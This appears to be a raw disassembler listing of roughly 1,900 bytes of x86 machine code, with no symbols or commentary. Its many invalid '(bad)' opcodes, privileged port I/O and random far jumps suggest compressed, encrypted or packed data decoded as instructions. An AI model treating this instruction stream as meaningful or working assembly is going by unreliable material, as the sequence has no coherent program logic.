  420cc8:	gs inc edx
  420cca:	scas   eax,DWORD PTR es:[edi]
  420ccb:	and    eax,0x9566998b
  420cd0:	sbb    eax,DWORD PTR [ebx]
  420cd2:	retf   0x59f8
  420cd5:	je     0x420d13
  420cd7:	imul   edi,ebp,0x4d337d11
  420cdd:	add    eax,0xda30ccea
  420ce2:	ret    0x3955
  420ce5:	pop    es
  420ce6:	shr    BYTE PTR [edx+edi*4+0x2],cl
  420cea:	xchg   cx,ax
  420cec:	xchg   ecx,eax
  420ced:	and    bl,BYTE PTR [eax+edi*2]
  420cf0:	mov    ebx,0x516aeb83
  420cf5:	inc    ebx
  420cf6:	int3   
  420cf7:	sub    cl,BYTE PTR [ebp+0x60]
  420cfa:	mov    esi,0x38a1e7e1
  420cff:	out    dx,al
  420d00:	inc    esi
  420d01:	aad    0xb5
  420d03:	js     0x420d0c
  420d05:	xchg   cl,ch
  420d07:	ins    DWORD PTR es:[edi],dx
  420d08:	imul   esp,DWORD PTR [ecx+0x52],0xc84b200f
  420d0f:	cld    
  420d10:	pop    edx
  420d11:	fcom   DWORD PTR [esi-0x3d346ab]
  420d17:	jb     0x420d4f
  420d19:	push   es
  420d1a:	jns    0x420cf5
  420d1c:	xlat   BYTE PTR ds:[ebx]
  420d1d:	push   esp
  420d1e:	int    0xa1
  420d20:	loop   0x420cc8
  420d22:	in     al,0x29
  420d24:	mov    dh,0x5d
  420d26:	push   ebp
  420d27:	sbb    al,0x2d
  420d29:	sub    eax,DWORD PTR [ebx-0x5eafaa85]
  420d2f:	inc    esp
  420d30:	sub    BYTE PTR [eax],0x2e
  420d33:	(bad)  
  420d34:	mov    bh,0x82
  420d36:	ja     0x420cf7
  420d38:	inc    ebx
  420d39:	adc    eax,0x36a5283d
  420d3e:	inc    esi
  420d3f:	push   ebx
  420d40:	lahf   
  420d41:	push   0x42
  420d43:	retf   
  420d44:	mov    edi,0x89ba9cb5
  420d49:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  420d4a:	and    edx,DWORD PTR [eax]
  420d4c:	cmp    edi,edi
  420d4e:	sbb    dl,BYTE PTR [edx-0x64]
  420d51:	inc    eax
  420d52:	pop    eax
  420d53:	xchg   DWORD PTR [ebp+0xd],edx
  420d56:	clc    
  420d57:	jns    0x420d69
  420d59:	pop    eax
  420d5a:	stos   DWORD PTR es:[edi],eax
  420d5b:	lods   eax,DWORD PTR ds:[esi]
  420d5c:	data16 test BYTE PTR [edx-0x57],dh
  420d60:	push   0x4b9d6d7f
  420d65:	add    esi,DWORD PTR [ecx+0x55724f80]
  420d6b:	jmp    0x6448:0x3fe5d285
  420d72:	cmp    bh,0xd
  420d75:	nop
  420d76:	pushf  
  420d77:	(bad)  
  420d79:	mov    esi,0x599e7f35
  420d7e:	stos   BYTE PTR es:[edi],al
  420d7f:	ja     0x420d04
  420d81:	lods   eax,DWORD PTR ds:[esi]
  420d82:	arpl   WORD PTR [eax],di
  420d84:	mov    ebx,0x6611931c
  420d89:	push   cs
  420d8a:	xchg   edi,eax
  420d8b:	pop    esp
  420d8c:	jmp    0x3cb1:0xbe66479a
  420d93:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  420d94:	cld    
  420d95:	xor    edx,edx
  420d97:	pop    ss
  420d98:	pop    esp
  420d99:	in     eax,dx
  420d9a:	shl    ecx,1
  420d9c:	imul   edi,DWORD PTR [ecx-0x6],0x739a867e
  420da3:	cmp    al,0xb3
  420da5:	cld    
  420da6:	test   DWORD PTR [esi+0x30938089],eax
  420dac:	dec    ebp
  420dad:	sub    eax,edi
  420daf:	out    0x45,al
  420db1:	les    ebp,FWORD PTR ds:0x855bd6fc
  420db7:	out    dx,al
  420db8:	gs jecxz 0x420ddd
  420dbb:	push   ds
  420dbc:	dec    DWORD PTR [edx]
  420dbe:	in     eax,dx
  420dbf:	xor    eax,DWORD PTR [eax-0x2e]
  420dc2:	(bad)  
  420dc3:	out    dx,al
  420dc4:	sbb    esp,DWORD PTR [ebp-0x62f311cc]
  420dca:	xlat   BYTE PTR ds:[ebx]
  420dcb:	and    edx,ecx
  420dcd:	mov    DWORD PTR [esi],ecx
  420dcf:	adc    BYTE PTR ds:0xb5a570dd,bh
  420dd5:	das    
  420dd6:	arpl   WORD PTR [ecx+0x5f],cx
  420dd9:	mov    ch,0xea
  420ddb:	jmp    0x8f9c5f19
  420de0:	test   eax,0xca0d6d5
  420de5:	dec    esp
  420de6:	jmp    0x420d7c
  420de8:	or     al,0xad
  420dea:	mov    ebp,0xdf6cc3e
  420def:	std    
  420df0:	jnp    0x420e21
  420df2:	and    eax,edx
  420df4:	in     al,dx
  420df5:	call   0xe5b6:0xe6a92ce8
  420dfc:	or     bl,BYTE PTR [eax-0x66]
  420dff:	mov    esp,0x86962853
  420e04:	adc    BYTE PTR [ebp+0x25a46056],al
  420e0a:	jecxz  0x420e82
  420e0c:	inc    ecx
  420e0d:	popf   
  420e0e:	pop    esp
  420e0f:	dec    ecx
  420e10:	stos   BYTE PTR es:[edi],al
  420e11:	xor    DWORD PTR [ebp-0x7a9500a2],0x69
  420e18:	xchg   ebx,eax
  420e19:	adc    ah,bl
  420e1b:	retf   0x2041
  420e1e:	popa   
  420e1f:	aas    
  420e20:	mov    ebx,0xd51acf70
  420e25:	lods   eax,DWORD PTR ds:[esi]
  420e26:	shl    BYTE PTR [ebx],1
  420e28:	aad    0x44
  420e2a:	std    
  420e2b:	mov    ecx,0xf6a276ba
  420e30:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  420e31:	and    al,ah
  420e33:	mov    dh,0x5a
  420e35:	repz mov bh,0xa0
  420e38:	xor    eax,0x41f0dee4
  420e3d:	push   ds
  420e3e:	mov    esp,0x14d4b160
  420e43:	daa    
  420e44:	dec    ecx
  420e45:	mov    WORD PTR [ebx-0xe55d75b],?
  420e4b:	loopne 0x420eb5
  420e4d:	push   edi
  420e4e:	sti    
  420e4f:	xchg   edi,eax
  420e50:	jb     0x420eab
  420e52:	sub    DWORD PTR [ecx],ebx
  420e54:	lahf   
  420e55:	loopne 0x420e6f
  420e57:	out    0x66,eax
  420e59:	mov    edi,0x195c33a8
  420e5e:	loop   0x420ed8
  420e60:	inc    edx
  420e61:	xor    DWORD PTR [edx+0x497ec016],0x4ea814ca
  420e6b:	std    
  420e6c:	mov    esi,0x16db0696
  420e71:	scas   al,BYTE PTR es:[edi]
  420e72:	cwde   
  420e73:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  420e74:	scas   eax,DWORD PTR es:[edi]
  420e75:	cmp    cl,dh
  420e77:	mov    bl,0x8d
  420e79:	outs   dx,DWORD PTR ds:[esi]
  420e7a:	cld    
  420e7b:	retf   0x8ec4
  420e7e:	and    al,0x6a
  420e80:	enter  0x9209,0xeb
  420e84:	mov    ebx,0x3989df8e
  420e89:	(bad)
  420e8d:	xor    ecx,ebp
  420e8f:	mov    edi,0xeb8c0d2a
  420e94:	shl    ecx,cl
  420e96:	push   cs
  420e97:	aad    0xa6
  420e99:	dec    ebp
  420e9a:	faddp  st(4),st
  420e9c:	xor    bl,BYTE PTR [eax-0x149d6890]
  420ea2:	jae    0x420eeb
  420ea4:	xor    eax,DWORD PTR [esi]
  420ea6:	xor    al,0x75
  420ea8:	stc    
  420ea9:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  420eaa:	xor    ch,BYTE PTR [edx+ebx*4-0x1b3e02c6]
  420eb1:	addr16 xchg esi,eax
  420eb3:	push   cs
  420eb4:	sbb    al,0x71
  420eb6:	dec    ebx
  420eb7:	pop    ecx
  420eb8:	imul   edx,DWORD PTR [ebp-0x4b01466f],0x4eb74652
  420ec2:	pushf  
  420ec3:	dec    edi
  420ec4:	mov    dh,0x67
  420ec6:	pop    esp
  420ec7:	loope  0x420f1d
  420ec9:	push   esi
  420eca:	js     0x420e66
  420ecc:	push   ss
  420ecd:	sub    al,BYTE PTR [ebx]
  420ecf:	dec    eax
  420ed0:	sub    BYTE PTR [edi-0x53],0xb4
  420ed4:	std    
  420ed5:	ret    0x3650
  420ed8:	mov    esi,0x2a218032
  420edd:	into   
  420ede:	jmp    DWORD PTR [edx]
  420ee0:	ins    DWORD PTR es:[edi],dx
  420ee1:	stos   BYTE PTR es:[edi],al
  420ee2:	inc    ecx
  420ee3:	test   eax,0xafe6c53a
  420ee8:	leave  
  420ee9:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  420eea:	mov    cs,WORD PTR [eax+0x53]
  420eed:	popf   
  420eee:	in     eax,dx
  420eef:	outs   dx,DWORD PTR ds:[esi]
  420ef0:	addr16 call 0xac92:0x6caf6d7a
  420ef8:	(bad)  
  420ef9:	xlat   BYTE PTR ds:[ebx]
  420efa:	sbb    DWORD PTR [ebp+0x1c5a863],esi
  420f00:	test   al,0x2f
  420f02:	iret   
  420f03:	fwait
  420f04:	mov    dh,0xc6
  420f06:	aas    
  420f07:	pavgb  mm0,QWORD PTR [esi]
  420f0a:	cmc    
  420f0b:	push   ecx
  420f0d:	aam    0x72
  420f0f:	dec    ebx
  420f10:	ins    DWORD PTR es:[edi],dx
  420f11:	mov    eax,0xb9cb51af
  420f16:	scas   eax,DWORD PTR es:[edi]
  420f17:	ins    BYTE PTR es:[edi],dx
  420f18:	xchg   ebx,eax
  420f19:	and    esi,DWORD PTR [esi-0x4989cc07]
  420f1f:	aad    0xe5
  420f21:	pop    esi
  420f22:	clc    
  420f23:	pusha  
  420f24:	inc    esi
  420f25:	xor    al,0x6c
  420f27:	push   es
  420f28:	pushf  
  420f29:	ins    BYTE PTR es:[edi],dx
  420f2a:	cld    
  420f2b:	and    al,0x39
  420f2d:	(bad)  [edi]
  420f2f:	mov    dl,0x33
  420f31:	cmp    eax,0x78cc1229
  420f36:	fisubr DWORD PTR [si+0x57]
  420f3a:	mov    ds:0x6b78ebb9,eax
  420f3f:	jae    0x420f10
  420f41:	arpl   WORD PTR [edx+edi*4],cx
  420f44:	sar    BYTE PTR [ebp-0x4cb6ba38],1
  420f4a:	ds inc esp
  420f4c:	popa   
  420f4d:	xchg   ebp,eax
  420f4e:	push   0x1d
  420f50:	ficom  WORD PTR [ebx]
  420f52:	aad    0xdd
  420f54:	wbinvd 
  420f56:	jmp    FWORD PTR [ebp+0x7f]
  420f59:	pop    eax
  420f5a:	push   eax
  420f5b:	add    BYTE PTR [ecx],dh
  420f5d:	sbb    eax,0xcc5ff840
  420f62:	inc    ecx
  420f63:	nop
  420f64:	push   ebp
  420f65:	outs   dx,BYTE PTR ds:[esi]
  420f66:	aam    0x92
  420f68:	xor    DWORD PTR [edi+0x69c478ad],0xbc8f664a
  420f72:	pop    ds
  420f73:	es add ebp,esp
  420f76:	retf   
  420f77:	in     al,dx
  420f78:	arpl   WORD PTR [edx-0x173a2289],dx
  420f7e:	scas   al,BYTE PTR es:[edi]
  420f7f:	lods   eax,DWORD PTR ds:[esi]
  420f80:	es scas eax,DWORD PTR es:[edi]
  420f82:	pushf  
  420f83:	aad    0xf1
  420f85:	mov    ecx,es
  420f87:	int3   
  420f88:	into   
  420f89:	out    0xf,al
  420f8b:	sub    edx,eax
  420f8d:	popf   
  420f8e:	aaa    
  420f8f:	hlt    
  420f90:	popf   
  420f91:	bound  edx,QWORD PTR ds:0xca8e53e2
  420f97:	mov    esp,0xa83fc0c4
  420f9c:	fcomp  QWORD PTR [ebx-0x11eb96db]
  420fa2:	into   
  420fa3:	and    DWORD PTR [edx-0x11de1346],edi
  420fa9:	adc    eax,0xcc2b80d1
  420fae:	mov    bl,0x8c
  420fb0:	fisub  DWORD PTR [ebx-0x30]
  420fb3:	xor    al,BYTE PTR [ebp+0x31]
  420fb6:	(bad)  
  420fb7:	fsub   DWORD PTR [esi]
  420fb9:	mov    ah,0xa7
  420fbb:	(bad)  
  420fbd:	pop    ecx
  420fbe:	sbb    al,0xb7
  420fc0:	or     al,0xc9
  420fc2:	cs cwde 
  420fc4:	xchg   edi,eax
  420fc5:	and    ah,ah
  420fc7:	jnp    0x420f59
  420fc9:	mov    ah,0xd3
  420fcb:	cmp    bl,BYTE PTR [edx]
  420fcd:	mov    cl,0x1e
  420fcf:	mov    edi,0x21b2bcff
  420fd4:	pop    es
  420fd5:	xchg   esp,eax
  420fd6:	in     eax,0x8b
  420fd8:	jne    0x519c8124
  420fde:	inc    ecx
  420fdf:	fisttp WORD PTR [ecx+0x719873e9]
  420fe5:	arpl   WORD PTR [edi+0x50930a06],si
  420feb:	or     BYTE PTR [ecx+0x42],0x8b
  420fef:	retf   0xee70
  420ff2:	push   ds
  420ff3:	push   eax
  420ff4:	retf   
  420ff5:	pop    ecx
  420ff6:	fsubr  st(2),st
  420ff8:	sub    eax,0x152f97e9
  420ffd:	xchg   edi,eax
  420ffe:	add    ebp,DWORD PTR [ebp+0x2a8c8f2]
  421004:	dec    ecx
  421005:	inc    edi
  421006:	jle    0x420ffa
  421008:	sub    DWORD PTR [ebx],esp
  42100a:	cmp    dl,dh
  42100c:	loope  0x420ff3
  42100e:	mov    eax,DWORD PTR [ebp-0x26]
  421011:	in     eax,dx
  421012:	and    al,0x35
  421014:	pop    esp
  421015:	jbe    0x42100a
  421017:	mov    edi,fs
  421019:	dec    edx
  42101a:	jp     0x420fc5
  42101c:	adc    dl,BYTE PTR [eax-0x64]
  42101f:	push   es
  421020:	and    DWORD PTR [eax+0x30cc17be],ebp
  421026:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  421027:	loop   0x420fb3
  421029:	sbb    esp,DWORD PTR [edx-0x76]
  42102c:	and    cl,BYTE PTR [esi+0x7f0da2e1]
  421032:	(bad)  
  421033:	adc    al,0xb6
  421035:	arpl   WORD PTR [edi],ax
  421037:	xor    eax,0x8d677745
  42103c:	adc    al,0x6f
  42103e:	rcl    eax,0x78
  421041:	and    al,0xfe
  421043:	inc    ecx
  421044:	inc    eax
  421045:	pop    ecx
  421046:	nop
  421047:	sbb    al,0x8b
  421049:	inc    ecx
  42104a:	mov    dh,0x8e
  42104c:	fldenv [ebx+eax*8]
  42104f:	stos   DWORD PTR es:[edi],eax
  421050:	lods   eax,DWORD PTR ds:[esi]
  421051:	cmp    BYTE PTR [ebx+0x25],bh
  421054:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  421055:	clc    
  421056:	sub    cl,BYTE PTR [edx-0x34e3fbf7]
  42105c:	psubsb mm4,QWORD PTR [ecx-0x61e7ded4]
  421063:	dec    edx
  421064:	push   ss
  421065:	das    
  421066:	jmp    0xb393:0x9f261b53
  42106d:	test   DWORD PTR [ebx],ebx
  42106f:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  421070:	dec    edx
  421071:	cmp    BYTE PTR [ecx],bh
  421073:	mov    dh,0xa6
  421075:	out    dx,eax
  421076:	jne    0x42103d
  421078:	xchg   esp,eax
  421079:	jle    0x4210e8
  42107b:	inc    ecx
  42107c:	and    DWORD PTR [ecx+ebx*4-0x71],esi
  421080:	std    
  421081:	inc    esi
  421082:	lock add al,0xbc
  421085:	addr16 jbe 0x42109d
  421088:	fidiv  WORD PTR [ebp-0xe763abb]
  42108e:	xchg   edi,eax
  42108f:	mov    BYTE PTR [esi-0x308d35a7],bl
  421095:	cmp    bh,BYTE PTR es:[ebx+eax*1]
  421099:	setge  BYTE PTR [edi]
  42109c:	lods   al,BYTE PTR ds:[esi]
  42109d:	cdq    
  42109e:	push   ebp
  42109f:	dec    edi
  4210a0:	cmp    ebp,esi
  4210a2:	mov    ?,WORD PTR [eax]
  4210a4:	mov    cl,0x50
  4210a6:	lds    edi,FWORD PTR ds:0xf0d4d04e
  4210ac:	or     esi,DWORD PTR [ecx+ebp*2]
  4210af:	inc    ebp
  4210b0:	mov    dh,0xa1
  4210b2:	inc    BYTE PTR [ebx]
  4210b4:	stos   DWORD PTR es:[edi],eax
  4210b5:	xor    ebp,DWORD PTR [edi-0x7f]
  4210b8:	call   0xb5c7:0x47ce5423
  4210bf:	sbb    dl,BYTE PTR [ebp-0x2e62b4e8]
  4210c5:	test   DWORD PTR [esp+edx*1-0x55],esp
  4210c9:	std    
  4210ca:	test   al,0x2d
  4210cc:	call   esi
  4210ce:	pushf  
  4210cf:	push   ebx
  4210d0:	hlt    
  4210d1:	mov    dh,0x85
  4210d3:	xchg   esi,eax
  4210d4:	(bad)  
  4210d5:	outs   dx,BYTE PTR ds:[esi]
  4210d6:	inc    ebp
  4210d7:	fmul   DWORD PTR [edx]
  4210d9:	adc    esp,edx
  4210db:	call   0xe686:0xfe0923ad
  4210e2:	xchg   BYTE PTR [edi+0xe8af55f],dh
  4210e8:	cmc    
  4210e9:	xchg   esp,eax
  4210ea:	jbe    0x421105
  4210ec:	stos   BYTE PTR es:[edi],al
  4210ed:	jge    0x4210d7
  4210ef:	inc    ebp
  4210f0:	out    0xd9,al
  4210f2:	push   es
  4210f3:	xchg   esp,eax
  4210f4:	dec    eax
  4210f5:	adc    ch,dl
  4210f7:	mov    esi,0x96c0b3c
  4210fc:	mov    bl,BYTE PTR [esi+ecx*4]
  4210ff:	clc    
  421100:	mov    bh,BYTE PTR [ecx-0x31]
  421103:	or     ah,0x2d
  421106:	aam    0x4e
  421108:	xchg   ebp,eax
  421109:	lock ins BYTE PTR es:[edi],dx
  42110b:	sub    edx,eax
  42110d:	cmc    
  42110e:	mov    DWORD PTR [edi],ebx
  421110:	dec    eax
  421111:	xor    dl,BYTE PTR [ecx-0x2f44dad4]
  421117:	ror    DWORD PTR [ecx+0x28],0x6
  42111b:	xchg   esi,eax
  42111c:	or     BYTE PTR [edx-0x35c394a8],dl
  421122:	call   0x4eec75b2
  421127:	daa    
  421128:	cmp    al,0x83
  42112a:	imul   ecx,DWORD PTR [ebx+0x68],0x34
  42112e:	jb     0x42113b
  421130:	push   esi
  421131:	xor    BYTE PTR [ebx+esi*8-0x14],bh
  421135:	xchg   edi,eax
  421136:	mov    edx,0x90274e5c
  42113b:	int3   
  42113c:	or     esi,DWORD PTR [edi+0x41]
  42113f:	adc    eax,0xe065a8d1
  421144:	frstor [edx+esi*2-0x2]
  421148:	mov    bl,bh
  42114a:	addr16 xor bl,dl
  42114d:	mov    ebp,0x2e50a608
  421152:	ret    
  421153:	adc    al,0xe0
  421155:	lfs    ebp,FWORD PTR [ebp+edi*4+0x54430d14]
  42115d:	mov    eax,ds:0x5494cf42
  421162:	mov    bh,0x10
  421164:	sbb    al,0x98
  421166:	add    al,0x86
  421168:	or     eax,0x4f7f86c
  42116d:	add    DWORD PTR [ecx-0x2858d754],esp
  421173:	enter  0x8c26,0x73
  421177:	sub    DWORD PTR [edx+0x2194c3bd],0xde199558
  421181:	xor    esi,DWORD PTR ds:0x526bfbe9
  421187:	cld    
  421188:	or     al,0x62
  42118a:	out    0x1e,al
  42118c:	and    eax,0xbe76b7ad
  421191:	xor    DWORD PTR [ecx-0x599eb53],esp
  421197:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  421198:	cmc    
  421199:	cmp    bh,BYTE PTR [esi+0x15]
  42119c:	pop    ebp
  42119d:	jle    0x421181
  42119f:	mov    ah,BYTE PTR [eax-0x5ea6e118]
  4211a5:	xchg   ecx,eax
  4211a6:	dec    esi
  4211a7:	sbb    BYTE PTR [ebp+0x7e],ah
  4211aa:	inc    esp
  4211ab:	mov    ds:0x6d52defa,eax
  4211b0:	pop    ecx
  4211b1:	test   esp,esp
  4211b3:	aam    0x23
  4211b5:	sub    cl,BYTE PTR [edx+ebp*4]
  4211b8:	gs pop esi
  4211ba:	jb     0x42117c
  4211bc:	xlat   BYTE PTR ds:[ebx]
  4211bd:	cld    
  4211be:	adc    ax,0xaaf4
  4211c2:	jbe    0x4211a8
  4211c4:	cld    
  4211c5:	mov    edi,0xfa2aa6e6
  4211ca:	popf   
  4211cb:	jbe    0x421206
  4211cd:	mov    ?,WORD PTR [esi-0x4a628393]
  4211d3:	and    al,0xaa
  4211d5:	push   edi
  4211d6:	jne    0x421159
  4211d8:	gs jb  0x4211ac
  4211db:	mov    bh,0x33
  4211dd:	jle    0x42119a
  4211df:	jo     0x4211ac
  4211e1:	(bad)  
  4211e2:	push   ebx
  4211e3:	push   edi
  4211e5:	popa   
  4211e6:	ja     0x4211d9
  4211e8:	pop    esp
  4211e9:	and    BYTE PTR [edi-0x26],0x64
  4211ed:	fstp   TBYTE PTR [edi]
  4211ef:	mov    ah,0xa
  4211f1:	outs   dx,DWORD PTR ds:[esi]
  4211f2:	out    0xbf,eax
  4211f4:	mov    sp,0xaf7f
  4211f8:	xchg   esp,eax
  4211f9:	repnz mov esp,0x472c4d6e
  4211ff:	mov    eax,ds:0xd36143e3
  421204:	test   BYTE PTR [edi],al
  421206:	loop   0x42125a
  421208:	pop    ebx
  421209:	cwde   
  42120a:	adc    DWORD PTR [eax],ebp
  42120c:	xlat   BYTE PTR ds:[ebx]
  42120d:	ins    DWORD PTR es:[edi],dx
  42120e:	out    0x4c,al
  421210:	out    dx,al
  421211:	or     eax,0x9b1b3e8d
  421216:	mov    ds:0x9ee61d6,al
  42121b:	sbb    al,0xc6
  42121d:	rol    DWORD PTR [ebx+0x21],0x2d
  421221:	in     eax,dx
  421222:	mov    BYTE PTR [esi],dl
  421224:	mov    cl,BYTE PTR [ebp+0x50452a1d]
  42122a:	xlat   BYTE PTR ds:[ebx]
  42122b:	xchg   ebp,eax
  42122c:	cmp    eax,0x6b38b8e
  421231:	loope  0x42123c
  421233:	mov    al,0xdb
  421235:	in     al,0xc0
  421237:	dec    ecx
  421238:	ss leave 
  42123a:	and    BYTE PTR [ecx+0x89fac45],dl
  421240:	xchg   DWORD PTR ds:0xc36a4423,esp
  421246:	clc    
  421247:	cmp    DWORD PTR [eax+0x60059a31],0x3ab8f975
  421251:	push   es
  421252:	fidivr WORD PTR [edx]
  421254:	rcr    BYTE PTR [edi+edx*8],1
  421257:	int3   
  421258:	adc    DWORD PTR [esi+0x4d],ecx
  42125b:	cmps   BYTE PTR fs:[esi],BYTE PTR es:[edi]
  42125d:	xchg   edi,eax
  42125e:	jge    0x421205
  421260:	pop    ecx
  421261:	xchg   DWORD PTR [ebp+0x5b],edx
  421264:	push   ecx
  421265:	dec    eax
  421266:	xor    BYTE PTR [ebx+edi*2+0x1f2ca6ff],0xef
  42126e:	arpl   WORD PTR [esp+ecx*8-0x31],dx
  421272:	cmp    DWORD PTR ds:0x632fa0fa,edx
  421278:	je     0x421218
  42127a:	xchg   ebp,eax
  42127b:	sub    esi,edi
  42127d:	(bad)  
  42127e:	jp     0x4212cd
  421280:	mov    esp,0x67be59f6
  421285:	fldcw  WORD PTR [edi]
  421287:	inc    esi
  421288:	sub    al,0x8
  42128a:	in     eax,0x61
  42128c:	jbe    0x42124f
  42128e:	or     ah,BYTE PTR [edi+eiz*1+0xb]
  421292:	ffree  st(7)
  421294:	sub    esp,esp
  421296:	cmp    DWORD PTR [edx+0x105c31b7],esi
  42129c:	mov    ecx,0x427d8999
  4212a1:	aas    
  4212a2:	dec    ebx
  4212a3:	stc    
  4212a4:	retf   
  4212a5:	test   BYTE PTR [ecx-0x1c],cl
  4212a8:	and    DWORD PTR [ebp+0x5d],ebx
  4212ab:	mov    eax,ds:0xa110db28
  4212b0:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4212b1:	nop
  4212b2:	adc    al,0xd8
  4212b4:	inc    ebx
  4212b6:	mov    edx,0xffbb1c5e
  4212bb:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4212bc:	jbe    0x4212cd
  4212be:	xchg   edx,eax
  4212bf:	mov    edx,0xde9e299f
  4212c4:	fisub  DWORD PTR ds:0xeb074375
  4212ca:	cmc    
  4212cb:	cmp    esi,DWORD PTR [eax]
  4212cd:	xchg   esi,eax
  4212ce:	hlt    
  4212cf:	or     DWORD PTR [ebx-0x48586fbc],ebx
  4212d5:	mov    eax,ds:0x9bf5fc18
  4212da:	xchg   DWORD PTR [eax],ebp
  4212dc:	popa   
  4212dd:	push   esi
  4212de:	aas    
  4212df:	jne    0x4212d7
  4212e1:	popf   
  4212e2:	cmp    DWORD PTR [ecx+0x47a68e24],ebp
  4212e8:	rcl    DWORD PTR ds:0x2816667c,cl
  4212ee:	call   0x8e9:0xf974d302
  4212f5:	sbb    eax,0x88cfb78
  4212fa:	xchg   al,ah
  4212fc:	add    eax,0x934618ff
  421301:	cld    
  421302:	nop
  421303:	dec    ebp
  421304:	jl     0x421333
  421306:	out    0x54,eax
  421308:	in     al,dx
  421309:	adc    al,0xcd
  42130b:	xchg   esi,eax
  42130c:	adc    eax,0xb76befdb
  421311:	add    esi,DWORD PTR [ebx-0x29]
  421314:	cmp    esp,DWORD PTR [ecx+0x4d]
  421317:	(bad)  
  421318:	iret   
  421319:	arpl   WORD PTR [edx-0x6c180cb],sp
  42131f:	mov    WORD PTR [ebx-0x59261be9],ds
  421325:	aas    
  421326:	cmp    bl,BYTE PTR [ebp-0x5b92d405]
  42132c:	or     DWORD PTR [eax+0x6],ebx
  42132f:	iret   
  421330:	rcr    BYTE PTR [eax+0x51e7c2b1],cl
  421336:	adc    ebx,DWORD PTR [edx+0x3a9ba9ff]
  42133c:	jmp    0x421334
  42133e:	and    esp,edi
  421340:	shl    DWORD PTR [edx],cl
  421342:	retf   0x481b
  421345:	mov    al,0xd9
  421347:	retf   0x96b9
  42134a:	inc    ebx
  42134b:	mov    dl,0x2d
  42134d:	cld    
  42134e:	mov    bh,0x58
  421350:	adc    DWORD PTR [esi],esi
  421352:	mov    ah,BYTE PTR [ebp+0x5567fd3f]
  421358:	inc    esp
  421359:	mov    cl,dl
  42135b:	dec    eax
  42135c:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  42135d:	js     0x42137f
  42135f:	imul   esi,esp,0xce3f8a88
  421365:	pop    ebp
  421366:	push   ds
  421367:	add    eax,DWORD PTR [ecx+0x75]
  42136a:	iret   
  42136b:	(bad)  
  42136c:	fcom   DWORD PTR [ecx]
  42136e:	pusha  
  42136f:	ja     0x421325
  421371:	add    BYTE PTR [ebp+edi*8+0x70],0x45
  421376:	test   BYTE PTR [edi-0x1426bd0c],bl
  42137c:	loopne 0x4213c6
  42137e:	jg     0x421346
  421380:	stc    
  421381:	test   eax,0xa7733daa
  421386:	xor    eax,0xd5ddd8a7
  42138b:	stos   DWORD PTR es:[edi],eax
  42138c:	aaa    
  42138d:	sub    ecx,DWORD PTR [ebp+0x44b5764d]
  421393:	or     DWORD PTR [esi+0x15],esp
  421396:	jne    0x42134e
  421398:	jecxz  0x4213d2
  42139a:	shl    esp,cl
  42139c:	cs hlt 
  42139e:	ja     0x421378
  4213a0:	adc    ecx,DWORD PTR [edi+0x37245ee]
  4213a6:	std    
  4213a7:	adc    bl,BYTE PTR [eax]
  4213a9:	cmp    ah,0xfe
  4213ac:	and    BYTE PTR [esi+0x36],ch
  4213af:	jge    0x42138d
  4213b1:	out    0x25,eax
  4213b3:	in     al,0x24
  4213b5:	mov    al,ds:0x8e1f0592
  4213ba:	shl    DWORD PTR [ecx-0x4a190f91],0x79
  4213c1:	rol    ecx,cl
  4213c3:	(bad)  
  4213c5:	sub    ch,bh
  4213c7:	shl    DWORD PTR [esi-0x2df1553f],1
  4213cd:	pop    es
  4213ce:	dec    ebx
  4213cf:	mov    al,ds:0x30e14457
  4213d4:	jnp    0x4213a4
  4213d6:	mov    esp,0xc111be7b
  4213db:	(bad)  
  4213dc:	imul   esp,ebp,0x88aa65d9
  4213e2:	dec    eax
  4213e3:	add    BYTE PTR [ebx+0x73],0xb7
  4213e7:	jae    0x42138d
  4213e9:	dec    edi
  4213ea:	outs   dx,BYTE PTR ds:[esi]
  4213eb:	scas   al,BYTE PTR es:[edi]
  4213ec:	inc    eax
  4213ed:	pop    ecx
  4213ee:	xchg   ebp,eax
  4213ef:	popa   
  4213f0:	icebp  
  4213f1:	rol    edi,0x50
  4213f4:	xchg   ebx,eax
  4213f5:	out    0x57,eax
  4213f7:	in     al,0x96
  4213f9:	mov    dh,0x56
  4213fb:	ds pop eax
  4213fd:	mov    DWORD PTR [esp+esi*2-0x32],esi
  421401:	jbe    0x421390
  421403:	jl     0x421400
  421405:	call   0xfc646229
  42140a:	pop    edx
  42140b:	adc    DWORD PTR [esi],eax
  42140d:	cs mov ebx,0xa81287e8
  421413:	push   esp
  421414:	inc    eax
  421415:	jb     0x421425
  421417:	stos   BYTE PTR es:[edi],al
  421418:	(bad)  
  421419:	xor    DWORD PTR [eax],esi
  42141b:	sbb    al,dh
  42141d:	mov    dl,0x77
  42141f:	fisttp QWORD PTR [edi]
  421421:	aaa    
  421422:	aad    0x64
  421424:	sbb    al,0xb4
  421426:	cmp    al,BYTE PTR [ebx+0x29851ee1]
  42142c:	mov    al,ds:0xe1b51179
  421431:	into   
  421432:	(bad)  
  421433:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  421434:	jmp    0xd9b78d5e
  421439:	push   ebx
  42143a:	ins    BYTE PTR es:[edi],dx
  42143b:	jno    0x421496
  42143d:	xchg   DWORD PTR [eax+0x53],esp
  421440:	and    BYTE PTR [ebp+0x625447ce],0x9c
  421447:	pushf  
  421448:	xchg   ecx,eax
  421449:	jo     0x421402
  42144b:	xor    BYTE PTR [ebp-0x79],bh
  42144e:	xchg   ebx,eax
  42144f:	jbe    0x4214ac
  421451:	mov    ah,0x76
  421453:	and    eax,0x2a421647
  421458:	pop    eax
  421459:	rcl    dh,cl
  42145b:	outs   dx,BYTE PTR ds:[esi]
  42145c:	jle    0x42145e
  42145e:	jecxz  0x4214b4
  421460:	jp     0x421490
  421462:	push   edx
  421463:	mov    edi,0x94feac1f
  421468:	cld    
  421469:	cmp    eax,esp
  42146b:	pop    sp
